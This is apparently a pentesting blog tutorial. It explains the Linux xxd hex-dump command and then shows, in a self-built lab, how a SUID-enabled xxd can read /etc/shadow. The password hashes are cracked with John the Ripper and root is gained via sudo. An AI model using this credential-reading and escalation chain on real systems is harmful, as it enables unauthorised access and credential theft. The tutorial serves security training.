<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Linux for Pentester: xxd Privilege Escalation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-for-pentester-xxd-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2019-06-16T16:34:44+00:00">June 16, 2019</time><time class="updated" datetime="2025-05-10T20:32:30+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we are going to make our readers familiar with another influential command i.e. “xxd” which assist for converting any hex dump to a binary and vice-versa. So, by knowing this certainty now we will check how wisely we can make it applicable in Privilege Escalation.</span></p>
<p><em><strong>Note: “The main objective of publishing the series of “Linux for pentester” is to introduce the circumstances and any kind of hurdles that can be faced by any pentester while solving CTF challenges or OSCP labs which are based on Linux privilege escalations. Here we do not criticizing any kind of misconfiguration that a network or system administrator does for providing higher permissions on any programs/binaries/files &amp; etc.”</strong>  </em></p>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<p><span style="color: #000000;"><strong>Introduction to xxd</strong></span></p>
<ul>
<li><span style="color: #000000;">Major Operation performed using xxd</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting xxd</strong></span></p>
<ul>
<li><span style="color: #000000;">SUID Lab setups for Privilege Escalation</span></li>
<li><span style="color: #000000;">Exploiting SUID</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Introduction to xxd</strong></span></h3>
<p><span style="color: #000000;">As we know whenever we want to convert any format of a file into another format then, we can grab that simply by using online converter which helps to convert a file into the desired format such as: “<strong>pdf to word, jpg to pdf, excel to pdf”</strong> etc. but what if someone desired to get any file into its hexadecimal form or binary??</span></p>
<p><span style="color: #000000;">So, in this article, I’m emphasizing the way through which one can easily get hex dump or binary format for any file. This can be achieved by one of Linux command i.e. “xxd”. The <strong>xxd</strong> command enables the user to generate a hex dump of a given file and can also reverse a hex dump back to its original ASCII form.  This phenomenon can also help in the procedure of encoding and decoding any mysterious file.</span></p>
<p><span style="color: #000000;">First, we will check for its help/man command to identify how we can use <strong>xxd</strong> for this conversion.</span></p>
<pre class="lang:default decode:true">xxd -h</pre>
<p><span style="color: #000000;">By typing the above command, we can achieve a list of arguments that can be used with<strong> xxd </strong>for generating hex dump of a given file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-scePj-d51Oo/XQZs1Jt2sgI/AAAAAAAAe1s/wLbMGWanp_8apnVcD64LEPrQEUQyxi-0QCLcBGAs/s1600/1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Major Operation performed using xxd</strong></span></h3>
<p><span style="color: #000000;"><strong>Converts file contents into hex</strong>: For instance, I’m creating a new file by the name of “secret.txt” and now I want to convert its whole content into the hexadecimal form so, I will type the below mentioned command to execute the desired output.</span></p>
<p><span style="color: #000000;"><strong>Syntax: xxd &lt;options&gt; filename</strong></span></p>
<pre class="lang:default decode:true">xxd secret.txt</pre>
<p><span style="color: #000000;">By the below image it’s clear that <strong>xxd</strong> has generated the hex dump for the file “secret.txt”.</span></p>
<p><span style="color: #000000;">Here, we can observe the following hex dump are obtained its default format such as:</span></p>
<ul>
<li><span style="color: #000000;">Indexing the number of lines. <em>(eg: 00000000, 00000010, 00000020…………00000220)</em></span></li>
<li><span style="color: #000000;">The default number of octets per group is 2 (-e: 4 little-endian hexdump) which is groupsize of 4 bytes. <em>(eg: 4967 6e69…………6e67)</em></span></li>
<li><span style="color: #000000;">The standard column length is equal to 16 bits with whitespace. <em>(eg: Ignite is Having)</em></span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RijQqTA9xFY/XQZs2jsELfI/AAAAAAAAe2A/QWri51NqphAEcWVEa50GTwYlS6cN8ly-ACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;"><strong>Skip the nth line with xxd: </strong>While converting a file there may be lots of data that may not be of our use so, instead of obtaining whole data we can skip those contents that are needless (skip the no. of lines). For this, we can use <strong>xxd </strong>to skip the <strong>nth</strong> line and produce hex value after skipped lines.</span></p>
<p><span style="color: #000000;">Suppose in our circumstance we want to generate hex dump from line 5 ahead then this can be attained by using “-s” argument followed by <strong>xxd</strong> command.</span></p>
<pre class="lang:default decode:true">xxd -s 0x50 secret.txt</pre>
<p><span style="color: #000000;"><strong>To limit output up to particular length:</strong> As above I have explained how one can retrieve data by skipping no. of lines i.e. output from a specific line but, if we need to limit the length of standard output then we will use “-l” argument instead of “-s”.</span></p>
<p><span style="color: #000000;">Here I’m limiting the length of my contents to print the data up to limited range i.e. <strong>5<sup>th</sup> line </strong>as shown in below screenshot.</span></p>
<pre class="lang:default decode:true">xxd -l 0x50 secret.txt</pre>
<p><span style="color: #000000;">Hence, we can observe the difference between both commands; the first command generates the hex value initialized from the 6<sup>th</sup> line and the second command ended with the 5<sup>th</sup> line as per hex indexing, take reference from the above screenshot.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-e4RKpD5jpDY/XQZs2gr-eSI/AAAAAAAAe18/9vfDX4x1bA8dqKrIJNRDEK6UEbU6FITiQCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;"><strong>Converts file contents into binary:</strong> In above all image we have noticed that file has been dumped into its “hex form” but whenever we wish to produce the “binary form” for any file then we will use “-b” option. On using this option, the result will switch to its bit dump (binary digit) by grouping the output data into its octet using “1 or 0” rather than hex dump. To attain the same as per below image type command:</span></p>
<pre class="lang:default decode:true">xxd -b secret.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SNAoJLZKTtQ/XQZs226Zk4I/AAAAAAAAe2E/C3WiZzYCUJASGD9szFBaCwZ9CbxSqJSswCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;"><strong>Set column length: </strong>As above I have described how we can skip and limits the output up to range. Now I will illustrate how we can set column length. By default, it used to be 12, 16 for any dumped file but now I will explain what else we can do.</span></p>
<p><span style="color: #000000;">For this I’m taking three occurrences:</span></p>
<p><span style="color: #000000;"><strong>Default:</strong> As we know the default column length is 16. This will print 16 characters including whitespace.</span></p>
<pre class="lang:default decode:true">xxd -l 0x20 secret.txt</pre>
<p><span style="color: #000000;"><strong>Set the column length up to 32:</strong> I have set end index to limit printing data range by using “-l” option now after doing so I will set column length up to “32” which can be achieved by using “-c” argument.</span></p>
<pre class="lang:default decode:true">xxd -l 0x40 -c 32 secret.txt</pre>
<p><span style="color: #000000;">From the given below screenshot, we can easily realize how <strong>xxd</strong> has limits the column length.</span></p>
<p><span style="color: #000000;"><strong>Set the column length up to 9:</strong> As above, now I have set column length up to “9” by following the same process as discussed above.</span></p>
<pre class="lang:default decode:true">xxd -l 0x40 -c 9 secret.txt</pre>
<p><span style="color: #000000;">In all case, <strong>xxd</strong> has created the <strong>hex dump</strong> for a file by counting each character with whitespace.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-pC-bhy021nc/XQZs3u9RVaI/AAAAAAAAe2I/Svi9g7fJo5YJf3LOD6XYME59kyQi3J18gCLcBGAs/s1600/5.png"/></strong></span></p>
<p><span style="color: #000000;"><strong>Print Plain hex dump style: </strong>The postscript option “-ps” is used only in case when we required our output in plain hex dump style. Here we have saved its output inside hex file to obtain the plain hexadecimal value of the <strong>secret.txt</strong> file. To ensure the result we have used the cat command to read output from hex file.</span></p>
<pre class="lang:default decode:true">xxd -ps secret.txt &gt; hex
cat hex</pre>
<p><span style="color: #000000;">From the below image, it can be cleared that how <strong>xxd</strong> has created plain hex dump style for file “secret.txt” by restricting the plain text.</span></p>
<p><span style="color: #000000;"><strong>To revert any file: </strong>To return any generated output into its original form we can use the “-r” option. In our case we have used “-r -p” to print the reverse output from plain <strong>hex dump style</strong> into its <strong>ASCII</strong> form.</span></p>
<pre class="lang:default decode:true">xxd -r -p hex</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-O6Jt3PrNu3k/XQZs4PfyTaI/AAAAAAAAe2Q/CCAMt72KSMYS_v8Qp-89HuHAPiM-10KgwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;"><strong>Groupsize bytes:</strong> If we required to group the output into a number of octets then we can use the “-g” option for this purpose. By default, it is <strong>2 </strong>(-e: 4 little-endian hex dump). So, if we set this value to 4 then it will be grouped into 8 bits.</span></p>
<p><span style="color: #000000;">In below screenshot, we have set this value to 8 which will group into 16 bits as desired output to concise the result.</span></p>
<pre class="lang:default decode:true">xxd -l 0x30 -g 8 secret.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-abwFJ0Tyb8E/XQZs3yvEUFI/AAAAAAAAe2M/aAUs69kizZoWZgUpHoXLSPTaryCCah0swCLcBGAs/s1600/7.png"/></span></p>
<h3><span style="color: #800000;"><strong>SUID Lab Setups for Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">The <strong>SUID</strong> bit permission enables the user to perform any files as the ownership of existing file member. Now we are enabling <strong>SUID</strong> permission on <strong>xxd</strong>, so that a local user can take the opportunity of xxd as the root user.</span></p>
<p><span style="color: #000000;">Hence type following for enabling SUID bit:</span></p>
<pre class="lang:default decode:true">which xxd
chmod u+s /usr/bin/xxd
ls -al /usr/bin/xxd</pre>
<h3><span style="color: #800000;"><strong>Exploiting SUID</strong></span></h3>
<p><span style="color: #000000;">Now we will start exploiting xxd service by taking the privilege of SUID permission. For this, I’m creating a session of the victim’s machine which will permit us to develop the local user access of the targeted system.</span></p>
<p><span style="color: #000000;">Now we need to connect with the target machine with ssh, so type the command:</span></p>
<pre class="lang:default decode:true">ssh test@192.168.1.103</pre>
<p><span style="color: #000000;">As we know we have access to victim’s machine so we will use find command to identify binaries having SUID permission.</span></p>
<pre class="lang:default decode:true"> find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;">Here we came to recognize that SUID bit is permitted for so many binary files, but our concerned is:   <strong>/usr/bin/xxd.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bGysZveH6rM/XQZs4m4sLiI/AAAAAAAAe2Y/yzvNjk8nSckbu_CDbt-oQpI4bOeDy4cAwCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Taking privilege of SUID permission on xxd we are going to grab the shadow’s file for extracting password hash file.</span></p>
<p><span style="color: #000000;">In the below image first, I have requested to expose the /etc/shadow file by the use of xxd which will produce the hex dump for the file along with that I have piped the xxd command to revert its output.</span></p>
<pre class="lang:default decode:true">xxd "/etc/shadow" | xxd -r</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-X0qKu-miqEI/XQZs1ALUn2I/AAAAAAAAe10/pKonq0uZC0ASIrPQdvDcH29TQEA4Td3EQCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now I have use john the ripper tool to crack the password hashes. By doing so we will get credential of the user as shown in below image.</span></p>
<pre class="lang:default decode:true">john hash</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-s_EXLo6i48M/XQZs1GGrl_I/AAAAAAAAe1w/GqsZ3KXmaFsiG3xFo9yTwhiBKAE_Wv2RQCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Once we get the user’s credential then we can switch user. Here first we check sudo rights for user: raj and noticed that user “raj” has ALL privileges.</span></p>
<pre class="lang:default decode:true">su raj
sudo -l
sudo su</pre>
<p><span style="color: #000000;">Therefore, we switch to the root user account directly and access the root shell as shown in the image. Hence, we have successfully accomplished our task of using <strong>xxd</strong> command for Privilege Escalation.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iAPlU8Kl0Xs/XQZs2NltbJI/AAAAAAAAe14/wI7LdXl0JccP2RhfEs-lfO5pwB0edGSaQCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer, she is completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/komal-rajput-26b783131/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
